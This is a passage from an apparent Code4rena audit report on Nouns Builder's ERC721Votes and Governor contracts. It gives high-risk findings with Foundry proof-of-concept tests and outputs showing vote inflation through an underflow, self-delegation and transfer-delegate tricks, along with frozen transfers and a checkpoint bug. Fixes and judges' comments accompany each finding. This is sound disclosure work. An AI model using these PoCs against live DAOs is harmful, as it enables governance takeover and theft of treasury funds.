1\n\n            vm.prank(bidder1);\n            auction.createBid{value: 1 ether}(3);\n\n            vm.warp(22 minutes);\n\n            auction.settleCurrentAndCreateNewAuction();\n\n            assertEq(token.ownerOf(3), bidder1);\n\n            console.log(token.balanceOf(bidder1)); // 2\n            console.log(token.getVotes(bidder1)); // 2\n            console.log(token.getVotes(bidder2)); // 1\n\n            vm.prank(bidder1);        \n            token.delegate(bidder1);\n\n            console.log(token.getVotes(bidder1)); // 4\n            console.log(token.getVotes(bidder2)); // 6277101735386680763835789423207666416102355444464034512895     \n      }\n\nWhen user1 delegates to another address `balanceOf(user1)` amount of tokens are subtraced from user2's votes, this will cause underflow and not revert since the statements are unchecked\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nChange delegate transfer in `afterTokenTransfer` to\n\n            _moveDelegateVotes(delegates(_from), delegates(_to), 1);\n\n**[Alex the Entreprenerd (judge) increased severity to High and commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/469#issuecomment-1257276491):**\n > The warden has shown how to exploit:\n> - An unchecked section of the code\n> - An incorrect logic in moving tokenDelegation\n> \n> To trigger an underflow that gives each user the maximum voting power.\n> \n> While some setup is necessary (having 1 token), I think the exploit is impactful enough to warrant High Severity, as any attacker will be able to obtain infinite voting power on multiple accounts.\n>\n> In contrast to other reports, this finding (as well as it's duplicates) are using an unchecked operation to negatively overflow the amount of votes to gain the maximum value.\n\n**[tbtstl (Nouns Builder) confirmed](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/469)**\n\n\n\n***\n\n## [[H-02] ERC721Votes's delegation disables NFT transfers and burning](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/373)\n_Submitted by hyh_\n\nIf Alice the NFT owner first delegates her votes to herself, second delegates to anyone else with delegate() or delegateBySig() then all her NFT ids will become stuck: their transfers and burning will be disabled.\n\nThe issue is \\_afterTokenTransfer() callback running the \\_moveDelegateVotes() with an owner instead of her delegate. As Alice's votes in the checkpoint is zero after she delegated them, the subtraction \\_moveDelegateVotes() tries to perform during the move of the votes will be reverted.\n\nAs ERC721Votes is parent to Token and delegate is a kind of common and frequent operation, the impact is governance token moves being frozen in a variety of use cases, which interferes with governance voting process and can be critical for the project.\n\n### Proof of Concept\n\nSuppose Alice delegated all her votes to herself and then decided to delegate them to someone else with either delegate() or delegateBySig() calling \\_delegate():\n\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L179-L190>\n\n```solidity\n    function _delegate(address _from, address _to) internal {\n        // Get the previous delegate\n        address prevDelegate = delegation[_from];\n\n        // Store the new delegate\n        delegation[_from] = _to;\n\n        emit DelegateChanged(_from, prevDelegate, _to);\n\n        // Transfer voting weight from the previous delegate to the new delegate\n        _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));\n    }\n```\n\n\\_moveDelegateVotes() will set her votes to `0` as `_from == Alice` and `prevTotalVotes = _amount = balanceOf(Alice)` (as \\_afterTokenTransfer() incremented Alice's vote balance on each mint to her):\n\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L196-L217>\n\n```solidity\n    function _moveDelegateVotes(\n        address _from,\n        address _to,\n        uint256 _amount\n    ) internal {\n        unchecked {\n            // If voting weight is being transferred:\n            if (_from != _to && _amount > 0) {\n                // If this isn't a token mint:\n                if (_from != address(0)) {\n                    // Get the sender's number of checkpoints\n                    uint256 nCheckpoints = numCheckpoints[_from]++;\n\n                    // Used to store the sender's previous voting weight\n                    uint256 prevTotalVotes;\n\n                    // If this isn't the sender's first checkpoint: Get their previous voting weight\n                    if (nCheckpoints != 0) prevTotalVotes = checkpoints[_from][nCheckpoints - 1].votes;\n\n                    // Update their voting weight\n                    _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);\n                }\n```\n\nAfter that her votes in the checkpoint become zero. She will not be able to transfer the NFT as `_afterTokenTransfer` will revert on `_moveDelegateVotes`'s attempt to move `1` vote from `Alice` to `_to`, while `checkpoints[Alice][nCheckpoints - 1].votes` is `0`:\n\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L262-L268>\n\n```solidity\n    function _afterTokenTransfer(\n        address _from,\n        address _to,\n        uint256 _tokenId\n    ) internal override {\n        // Transfer 1 vote from the sender to the recipient\n        _moveDelegateVotes(_from, _to, 1);\n```\n\n### Recommended Mitigation Steps\n\nThe root issue is \\_afterTokenTransfer() dealing with Alice instead of Alice's delegate.\n\nConsider including delegates() call as a fix:\n\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L262-L268>\n\n```solidity\n    function _afterTokenTransfer(\n        address _from,\n        address _to,\n        uint256 _tokenId\n    ) internal override {\n        // Transfer 1 vote from the sender to the recipient\n-       _moveDelegateVotes(_from, _to, 1);\n+       _moveDelegateVotes(delegates(_from), delegates(_to), 1);\n```\n\nAs `delegates(address(0)) == address(0)` the burning/minting flow will persist:\n\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L124-L129>\n\n```solidity\n    /// @notice The delegate for an account\n    /// @param _account The account address\n    function delegates(address _account) external view returns (address) {\n        address current = delegation[_account];\n        return current == address(0) ? _account : current;\n    }\n```\n\n**[tbtstl (Nouns Builder) confirmed](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/373)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/373#issuecomment-1258703067):**\n > The Warden has shown how, due to the overlapping system handling delegation and balances, it is possible for a user to brick their own `transferability` of their tokens.\n> \n> This POC shows that any delegation will cause the issues as when dealing with a transfer, their currently zero-vote-balance will further be deducted instead of the delegated votes they have.\n> \n> Because the finding shows a broken invariant, in that any delegation will brick transfers, as the invariants offered by ERC721Votes have been broken; I believe High Severity to be appropriate.\n\n\n\n***\n\n## [[H-03] Multiple vote checkpoints per block will lead to incorrect vote accounting](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/185)\n_Submitted by berndartmueller, also found by 0x52, 0xSky, bin2chen, cccz, Chom, davidbrai, elprofesor, izhuer, m9800, PwnPatrol, and rvierdiiev_\n\nVoting power for each NFT owner is persisted within timestamp-dependent checkpoints. Every voting power increase or decrease is recorded. However, the implementation of `ERC721Votes` creates separate checkpoints with the same timestamp for each interaction, even when the interactions happen in the same block/timestamp.\n\n### Impact\n\nCheckpoints with the same `timestamp` will cause issues within the `ERC721Votes.getPastVotes(..)` function and will return incorrect votes for a given `_timestamp`.\n\n### Proof of Concept\n\n[lib/token/ERC721Votes.sol#L252-L253](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L252-L253)\n\n```solidity\n/// @dev Records a checkpoint\n/// @param _account The account address\n/// @param _id The checkpoint id\n/// @param _prevTotalVotes The account's previous voting weight\n/// @param _newTotalVotes The account's new voting weight\nfunction _writeCheckpoint(\n    address _account,\n    uint256 _id,\n    uint256 _prevTotalVotes,\n    uint256 _newTotalVotes\n) private {\n    // Get the pointer to store the checkpoint\n    Checkpoint storage checkpoint = checkpoints[_account][_id];\n\n    // Record the updated voting weight and current time\n    checkpoint.votes = uint192(_newTotalVotes);\n    checkpoint.timestamp = uint64(block.timestamp);\n\n    emit DelegateVotesChanged(_account, _prevTotalVotes, _newTotalVotes);\n}\n```\n\n**Consider the following example and the votes checkpoint snapshots:**\n\n*Note: Bob owns a smart contract used to interact with the protocol*\n\n**Transaction 0:** Bob's smart contract receives 1 NFT through minting (1 NFT equals 1 vote)\n\n| Checkpoint Index | Timestamp | Votes |\n| ---------------- | --------- | ----- |\n| 0                | 0         | 1     |\n\n**Transaction 1:** Bob's smart contract receives one more NFT through minting\n\n| Checkpoint Index | Timestamp | Votes |\n| ---------------- | --------- | ----- |\n| 0                | 0         | 1     |\n| 1                | 1         | 2     |\n\n**Transaction 1:** Within the same transaction 1, Bob's smart-contract delegates 2 votes to Alice\n\n| Checkpoint Index | Timestamp | Votes |\n| ---------------- | --------- | ----- |\n| 0                | 0         | 1     |\n| 1                | 1         | 2     |\n| 2                | 1         | 0     |\n\n**Transaction 1:** Again within the same transaction 1, Bob's smart contract decides to reverse the delegation and self-delegates\n\n| Checkpoint Index | Timestamp | Votes |\n| ---------------- | --------- | ----- |\n| 0                | 0         | 1     |\n| 1                | 1         | 2     |\n| 2                | 1         | 0     |\n| 3                | 1         | 2     |\n\n**Transaction 1:** Bob's smart contract buys one more NFT\n\n| Checkpoint Index | Timestamp | Votes |\n| ---------------- | --------- | ----- |\n| 0                | 0         | 1     |\n| 1                | 1         | 2     |\n| 2                | 1         | 0     |\n| 3                | 1         | 2     |\n| 4                | 2         | 3     |\n\nBob now wants to vote (via his smart contract) on a governance proposal that has been created on `timeCreated = 1` (timestamp 1).\n\nInternally, the `Governor._castVote` function determines the voter's weight by calling `getVotes(_voter, proposal.timeCreated)`.\n\n[governance/governor/Governor.sol#L275](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L275)\n\n```solidity\nweight = getVotes(_voter, proposal.timeCreated);\n```\n\n`getVotes` calls `ERC721.getPastVotes` internally:\n\n[governance/governor/Governor.sol#L462](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L462)\n\n```solidity\nfunction getVotes(address _account, uint256 _timestamp) public view returns (uint256) {\n    return settings.token.getPastVotes(_account, _timestamp);\n}\n```\n\n`ERC721.getPastVotes(..., 1)` tries to find the checkpoint within the `while` loop:\n\n| # Iteration | `low` | `middle` | `high` |\n| ----------- | ----- | -------- | ------ |\n| 0           | 0     | 2        | 4      |\n\nThe `middle` checkpoint with index `2` matches the given timestamp `1` and returns `0` votes. This is incorrect, as Bob has 2 votes. Bob is not able to vote properly.\n\n*(Please be aware that this is just one of many examples of how this issue can lead to incorrect vote accounting. In other cases, NFT owners could have more voting power than they are entitled to)*\n\n### Recommended mitigation steps\n\nConsider batching multiple checkpoints writes per block/timestamp similar to how NounsDAO records checkpoints.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/185#issuecomment-1258049019):**\n > The Warden has shown how the checkpoint math can be gamed, opening up governance to flashloan exploits, infinite voting power and overall breaking all of governance quorum and execution thresholds.\n> \n> Because any attacker can spam create checkpoints, to manipulate the result of the Binary Search, they can manipulate their balance to make the Governor think it's way higher than intended.\n> \n> Mitigation requires ensuring that the only balance recorded for a block is the latest value (end of flashloan so the balance goes back down).\n> \n> Because the finding breaks accounting, allowing governance takeover, and the invariants of ERC721Votes are broken (votes are not what they are), I agree with High Severity.\n\n**[kulkarohan (Nouns Builder) confirmed](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/185)**\n\n\n\n***\n\n## [[H-04] `ERC721Votes`: Token owners can double voting power through self delegation](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/413)\n*Submitted by zkhorse, also found by berndartmueller, Ch\\_301, hxzy, hyh, MEP, pcarranzav, pfapostol, Picodes, and Solimander*\n\nThe owner of one or many `ERC721Votes` tokens can double their voting power once (and only once) by delegating to their own address as their first delegation.\n\n### Scenario\n\nThis exploit relies on the initial default value of the `delegation` mapping in `ERC721Votes`, which is why it will only work once per address.\n\nFirst, the token owner must call `delegate` or `delegateBySig`, passing their own address as the delegate:\n\n[`ERC721Votes#delegate`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L131-L135)\n\n```solidity\n    /// @notice Delegates votes to an account\n    /// @param _to The address delegating votes to\n    function delegate(address _to) external {\n        _delegate(msg.sender, _to);\n    }\n```\n\nThis calls into the internal `_delegate` function, with `_from` and `_to` both set to the token owner's address:\n\n[`ERC721Votes#_delegate`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L176-L190)\n\n```solidity\n    /// @dev Updates delegate addresses\n    /// @param _from The address delegating votes from\n    /// @param _to The address delegating votes to\n    function _delegate(address _from, address _to) internal {\n        // Get the previous delegate\n        address prevDelegate = delegation[_from];\n\n        // Store the new delegate\n        delegation[_from] = _to;\n\n        emit DelegateChanged(_from, prevDelegate, _to);\n\n        // Transfer voting weight from the previous delegate to the new delegate\n        _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));\n    }\n```\n\nSince this is the token owner's first delegation, the `delegation` mapping does not contain a value for the `_from` address, and `prevDelegate` on L#181 will be set to `address(0)`:\n\n[`ERC721Votes.sol#L180-L181`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L180-L181)\n\n```solidity\n        // Get the previous delegate\n        address prevDelegate = delegation[_from];\n```\n\nThis function then calls into `_moveDelegateVotes` to transfer voting power. This time, `_from` is `prevDelegate`, equal to `address(0)`; `_to` is the token owner's address; and `_amount` is `balanceOf(_from)`, the token owner's current balance:\n\n[`ERC721Votes#_moveDelegateVotes`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L192-L235)\n\n```solidity\n /// @dev Transfers voting weight\n    /// @param _from The address delegating votes from\n    /// @param _to The address delegating votes to\n    /// @param _amount The number of votes delegating\n    function _moveDelegateVotes(\n        address _from,\n        address _to,\n        uint256 _amount\n    ) internal {\n        unchecked {\n            // If voting weight is being transferred:\n            if (_from != _to && _amount > 0) {\n                // If this isn't a token mint:\n                if (_from != address(0)) {\n                    // Get the sender's number of checkpoints\n                    uint256 nCheckpoints = numCheckpoints[_from]++;\n\n                    // Used to store the sender's previous voting weight\n                    uint256 prevTotalVotes;\n\n                    // If this isn't the sender's first checkpoint: Get their previous voting weight\n                    if (nCheckpoints != 0) prevTotalVotes = checkpoints[_from][nCheckpoints - 1].votes;\n\n                    // Update their voting weight\n                    _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);\n                }\n\n                // If this isn't a token burn:\n                if (_to != address(0)) {\n                    // Get the recipients's number of checkpoints\n                    uint256 nCheckpoints = numCheckpoints[_to]++;\n\n                    // Used to store the recipient's previous voting weight\n                    uint256 prevTotalVotes;\n\n                    // If this isn't the recipient's first checkpoint: Get their previous voting weight\n                    if (nCheckpoints != 0) prevTotalVotes = checkpoints[_to][nCheckpoints - 1].votes;\n\n                    // Update their voting weight\n                    _writeCheckpoint(_to, nCheckpoints, prevTotalVotes, prevTotalVotes + _amount);\n                }\n            }\n        }\n    }\n```\n\nThe `if` condition on L#203 is `true`, since `_from` is `address(0)`, `_to` is the owner address, and `_amount` is nonzero:\n\n[`ERC721Votes.sol#L202-L203`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L202-L203)\n\n```solidity\n            // If voting weight is being transferred:\n            if (_from != _to && _amount > 0) {\n```\n\nExecution skips the `if` block on L#205-217, since `_from` is `address(0)`:\n\n[`ERC721Votes.sol#L205-L217`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L204-L217)\n\n```solidity\n                // If this isn't a token mint:\n                if (_from != address(0)) {\n                    // Get the sender's number of checkpoints\n                    uint256 nCheckpoints = numCheckpoints[_from]++;\n\n                    // Used to store the sender's previous voting weight\n                    uint256 prevTotalVotes;\n\n                    // If this isn't the sender's first checkpoint: Get their previous voting weight\n                    if (nCheckpoints != 0) prevTotalVotes = checkpoints[_from][nCheckpoints - 1].votes;\n\n                    // Update their voting weight\n                    _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);\n                }\n```\n\nHowever, the `if` block on L#220-232 will execute and increase the voting power allocated to `_to`:\n\n[`ERC721Votes.sol#L220-L232`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L219-L232)\n\n```solidity\n                // If this isn't a token burn:\n                if (_to != address(0)) {\n                    // Get the recipients's number of checkpoints\n                    uint256 nCheckpoints = numCheckpoints[_to]++;\n\n                    // Used to store the recipient's previous voting weight\n                    uint256 prevTotalVotes;\n\n                    // If this isn't the recipient's first checkpoint: Get their previous voting weight\n                    if (nCheckpoints != 0) prevTotalVotes = checkpoints[_to][nCheckpoints - 1].votes;\n\n                    // Update their voting weight\n                    _writeCheckpoint(_to, nCheckpoints, prevTotalVotes, prevTotalVotes + _amount);\n                }\n```\n\nThe token owner's voting power has now been increased by an amount equal to their total number of tokens, without an offsetting decrease.\n\nThis exploit only works once: if a token owner subsequently delegates to themselves after their initial self delegation, `prevDelegate` will be set to a non-default value in `_delegate`, and the delegation logic will work as intended.\n\n### Impact\n\nMalicious `ERC21Votes` owners can accrue more voting power than they deserve. Especially malicious owners may quietly acquire multiple tokens before doubling their voting power. In an early DAO with a small supply of tokens, the impact of this exploit could be significant.\n\n### Recommended Mitigation Steps\n\nMake the `delegates` function `public` rather than `external`:\n\n```solidity\n    /// @notice The delegate for an account\n    /// @param _account The account address\n    function delegates(address _account) public view returns (address) {\n        address current = delegation[_account];\n        return current == address(0) ? _account : current;\n    }\n```\n\nThen, call this function rather than accessing the `delegation` mapping directly:\n\n```solidity\n    /// @dev Updates delegate addresses\n    /// @param _from The address delegating votes from\n    /// @param _to The address delegating votes to\n    function _delegate(address _from, address _to) internal {\n        // Get the previous delegate\n        address prevDelegate = delegates(_from);\n\n        // Store the new delegate\n        delegation[_from] = _to;\n\n        emit DelegateChanged(_from, prevDelegate, _to);\n\n        // Transfer voting weight from the previous delegate to the new delegate\n        _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));\n    }\n```\n\nNote that the original NounsDAO contracts follow this pattern. (See [here](https://github.com/nounsDAO/nouns-monorepo/blob/master/packages/nouns-contracts/contracts/base/ERC721Checkpointable.sol#L83-L91) and [here](https://github.com/nounsDAO/nouns-monorepo/blob/master/packages/nouns-contracts/contracts/base/ERC721Checkpointable.sol#L83-L91)).\n\n### Test cases\n\n(Put the following test cases in `Gov.t.sol`)\n\n```solidity\n    function test_delegate_to_self_doubles_voting_power() public {\n        mintVoter1();\n\n        assertEq(token.getVotes(address(voter1)), 1);\n\n        vm.startPrank(voter1);\n        token.delegate(address(voter1));\n\n        assertEq(token.getVotes(address(voter1)), 2);\n    }\n\n    function mintToken(uint256 tokenId) internal {\n        vm.prank(voter1);\n        auction.createBid{ value: 0.420 ether }(tokenId);\n\n        vm.warp(block.timestamp + auctionParams.duration + 1 seconds);\n        auction.settleCurrentAndCreateNewAuction();\n    }\n\n    function test_delegate_to_self_multiple_tokens_doubles_voting_power() public {\n        // An especially malicious user may acquire multiple tokens\n        // before doubling their voting power through this exploit.\n        mintVoter1();\n        mintToken(3);\n        mintToken(4);\n        mintToken(5);\n        mintToken(6);\n\n        assertEq(token.getVotes(address(voter1)), 5);\n\n        vm.prank(voter1);\n        token.delegate(address(voter1));\n\n        assertEq(token.getVotes(address(voter1)), 10);\n    }\n```\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/413#issuecomment-1258152894):**\n > The warden has shown how, because of an incorrect assumption in reducing a non-existing previous delegate votes, through self-delegation, a user can double their voting power.\n> \n> Because the finding shows how the delegation system is broken, and because governance is a core aspect (Secure funds, move funds, etc..) I agree with High Severity.\n> \n> Due to multiple reports of this type, with various different attacks, mitigation is non-trivial.\n\n**[kulkarohan (Nouns Builder) confirmed](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/413)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/413#issuecomment-1261348244):**\n > In contrast to the dangerous overflow, this finding (and its duplicates) has shown how the Delegation Mechanism can be used to double the voting power.\n> \n> For that reason, the underlying issue being different, am choosing to leave this finding separate.\n\n\n\n***\n\n## [[H-05] `_transferFrom()` can be used to indefinitely increase voting power](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/224)\n*Submitted by Soosh, also found by Ch\\_301, davidbrai, and PwnPatrol*\n\nIt is possible to indefinitely increase voting power by creating new accounts (addresses) and delegating. This will lead to unfair governance as a user can vote with more votes than actual.\n\n### Explanation\n\nThe `_transferFrom()`  does not move delegates from the src's delegates to the destination's delegates, instead, it moves directly from src to dest. (see recommendations and Code POC for better understanding)\n\n### Code POC\n\n```solidity\n// Insert this test case into Token.t.sol\n// Run: forge test --match-contract Token -vv\n\nimport \"forge-std/console.sol\";\n...\nfunction testIncreaseVotePower() public {\n        deployMock();\n\n        address voter1;\n        address voter2;\n        uint256 voter1PK;\n        uint256 voter2PK;\n\n        // Voter with 1 NFT voting power\n        voter1PK = 0xABC;\n        voter1 = vm.addr(voter1PK);\n        vm.deal(voter1, 1 ether);\n        // Second account created by same voter\n        voter2PK = 0xABD;\n        voter2 = vm.addr(voter2PK);\n\n\t\t// Giving voter1 their 1 NFT\n        vm.prank(founder);\n        auction.unpause();\n        vm.prank(voter1);\n        auction.createBid{ value: 0.420 ether }(2);\n        vm.warp(auctionParams.duration + 1 seconds);\n        auction.settleCurrentAndCreateNewAuction();\n\n        // Start Exploit\n        console.log(\"Initial Votes\");\n        console.log(\"voter1: \", token.getVotes(voter1));\n        console.log(\"voter2: \", token.getVotes(voter2));\n        \n        vm.prank(voter1);\n        token.delegate(voter2);\n        console.log(\"After Delegating Votes, voter1 -> delegate(voter2)\");\n        console.log(\"voter1: \", token.getVotes(voter1));\n        console.log(\"voter2: \", token.getVotes(voter2));\n\n        vm.prank(voter1);\n        token.transferFrom(voter1, voter2, 2); \n        console.log(\"After Token transfer, voter1 -transferFrom()-> voter2\");\n        console.log(\"voter1 votes: \", token.getVotes(voter1));\n        console.log(\"voter2 votes: \", token.getVotes(voter2));\n\n        vm.prank(voter2);\n        token.delegate(voter2);\n        console.log(\"After Delegating Votes, voter2 -> delegate(voter2)\");\n        console.log(\"voter1: \", token.getVotes(voter1));\n        console.log(\"voter2: \", token.getVotes(voter2));\n    }\n```\n\nExpected Output:\n\n```solidity\n[PASS] testVoteDoublePower() (gas: 3544946)\nLogs:\n  Initial Votes\n  voter1:  1\n  voter2:  0\n  After Delegating Votes, voter1 -> delegate(voter2)   \n  voter1:  1\n  voter2:  1\n  After Token transfer, voter1 -transferFrom()-> voter2\n  voter1 votes:  0\n  voter2 votes:  2\n  After Delegating Votes, voter2 -> delegate(voter2)   \n  voter1:  0\n  voter2:  3\n```\n\n### Recommended Mitigation Steps\n\nLooking at [OpenZeppelin's ERC721Votes](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/6a8d977d2248cf1c115497fccfd7a2da3f86a58f/contracts/token/ERC721/extensions/draft-ERC721Votes.sol#L13) which I believe the team took reference from, it states:\n\n    * Tokens do not count as votes until they are delegated, because votes must be tracked which incurs an additional cost\n    * on every transfer. Token holders can either delegate to a trusted representative who will decide how to make use of\n    * the votes in governance decisions, or they can delegate to themselves to be their own representative.\n\nThe current implementation does not follow this, and tokens count as votes without being delegated. To fix this issue, votes should only be counted when delegated.\n\n*   I believe the issue is here on this [line](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268)\n\n```solidity\n// Transfer 1 vote from the sender to the recipient\n        _moveDelegateVotes(_from, _to, 1);\n```\n\nWhere it should move from the delegate of `_from` to the delegate of `_to`. Suggested FIx:\n\n```solidity\n _moveDelegateVotes(delegation[_from], delegation[_to], 1);\n```\n\n**[iainnash (Nouns Builder) confirmed and commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/224#issuecomment-1258530566):**\n > Would agree w/ High risk.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/224#issuecomment-1258739921):**\n > The Warden has shown how, due to an incorrect handling of delegation, a Token Holder can delegate their voting power without losing it, allowing for an exploit that allows them to reach infinite voting power.\n> \n> I believe that some of the problems with Delegation shown via this contest can be traced down to this quote from the [OZ Documentation](https://docs.openzeppelin.com/contracts/4.x/api/token/erc721#ERC721Votes)\n> `\n> Tokens do not count as votes until they are delegated, because votes must be tracked which incurs an additional cost on every transfer. Token holders can either delegate to a trusted representative who will decide how to make use of the votes in governance decisions, or they can delegate to themselves to be their own representative.\n> `\n> \n> Remediation of this specific issue can be done by following the warden advice, and using the Test Case to verify the exploit has been patched, additionally, further thinking into how delegation should behave will be necessary to ensure the system is patched to safety\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/224#issuecomment-1261353232):**\n > In contrast to [issue 469](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/469) (Unsafe Underflow) and [issue 413](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/413) (Self Delegation for doubling of votes), this report is showing how, due to an incorrect accounting, a user can repeatedly transfer and delegate to achieve infinite voting power.\n> \n> While the outcome of all 3 is increased voting power, I believe the uniqueness of the attack is in exploiting a different aspect of the code.\n> \n> Remediation should account for all 3 exploits, and I believe, because of the uniqueness of the attack, that this is a distinct report vs the previously mentioned.\n\n\n\n***\n \n# Medium Risk Findings (28)\n## [[M-01] Quorum votes have no effect for determining whether proposal is defeated or succeeded when token supply is low](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/607)\n_Submitted by rbserver, also found by cccz, dipp, joestakey, pashov, and R2_\n\nAt the early stage of the deployed DAO, it is possible that the following `quorum` function returns 0 because the token supply is low.\n\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L473-L477>\n\n```solidity\n    function quorum() public view returns (uint256) {\n        unchecked {\n            return (settings.token.totalSupply() * settings.quorumThresholdBps) / 10_000;\n        }\n    }\n```\n\nWhen calling the following `propose` function, `proposal.quorumVotes = uint32(quorum())` is executed. If `quorum()` returns 0, `proposal.quorumVotes` is set to 0.\n\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L116-L175>\n\n```solidity\n    function propose(\n        address[] memory _targets,\n        uint256[] memory _values,\n        bytes[] memory _calldatas,\n        string memory _description\n    ) external returns (bytes32) {\n        // Get the current proposal threshold\n        uint256 currentProposalThreshold = proposalThreshold();\n\n        // Cannot realistically underflow and `getVotes` would revert\n        unchecked {\n            // Ensure the caller's voting weight is greater than or equal to the threshold\n            if (getVotes(msg.sender, block.timestamp - 1) < proposalThreshold()) revert BELOW_PROPOSAL_THRESHOLD();\n        }\n\n        // Cache the number of targets\n        uint256 numTargets = _targets.length;\n\n        // Ensure at least one target exists\n        if (numTargets == 0) revert PROPOSAL_TARGET_MISSING();\n\n        // Ensure the number of targets matches the number of values and calldata\n        if (numTargets != _values.length) revert PROPOSAL_LENGTH_MISMATCH();\n        if (numTargets != _calldatas.length) revert PROPOSAL_LENGTH_MISMATCH();\n\n        // Compute the description hash\n        bytes32 descriptionHash = keccak256(bytes(_description));\n\n        // Compute the proposal id\n        bytes32 proposalId = hashProposal(_targets, _values, _calldatas, descriptionHash);\n\n        // Get the pointer to store the proposal\n        Proposal storage proposal = proposals[proposalId];\n\n        // Ensure the proposal doesn't already exist\n        if (proposal.voteStart != 0) revert PROPOSAL_EXISTS(proposalId);\n\n        // Used to store the snapshot and deadline\n        uint256 snapshot;\n        uint256 deadline;\n\n        // Cannot realistically overflow\n        unchecked {\n            // Compute the snapshot and deadline\n            snapshot = block.timestamp + settings.votingDelay;\n            deadline = snapshot + settings.votingPeriod;\n        }\n\n        // Store the proposal data\n        proposal.voteStart = uint32(snapshot);\n        proposal.voteEnd = uint32(deadline);\n        proposal.proposalThreshold = uint32(currentProposalThreshold);\n        proposal.quorumVotes = uint32(quorum());\n        proposal.proposer = msg.sender;\n        proposal.timeCreated = uint32(block.timestamp);\n\n        emit ProposalCreated(proposalId, _targets, _values, _calldatas, _description, descriptionHash, proposal);\n\n        return proposalId;\n    }\n```\n\nWhen determining the proposal's state, the following `state` function is called, which can execute `else if (proposal.forVotes < proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) { return ProposalState.Defeated; }`. If `proposal.quorumVotes` is 0, the `proposal.forVotes < proposal.quorumVotes` condition would always be `false`. Essentially, quorum votes have no effect at all for determining whether the proposal is defeated or succeeded when the token supply is low. Hence, critical proposals, such as for updating implementations or withdrawing funds from the treasury, that should not be passed if there are effective quorum votes for which the for votes fail to reach can be passed, or vice versa, so the impact can be huge.\n\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L413-L456>\n\n```solidity\n    function state(bytes32 _proposalId) public view returns (ProposalState) {\n        // Get a copy of the proposal\n        Proposal memory proposal = proposals[_proposalId];\n\n        // Ensure the proposal exists\n        if (proposal.voteStart == 0) revert PROPOSAL_DOES_NOT_EXIST();\n\n        // If the proposal was executed:\n        if (proposal.executed) {\n            return ProposalState.Executed;\n\n            // Else if the proposal was canceled:\n        } else if (proposal.canceled) {\n            return ProposalState.Canceled;\n\n            // Else if the proposal was 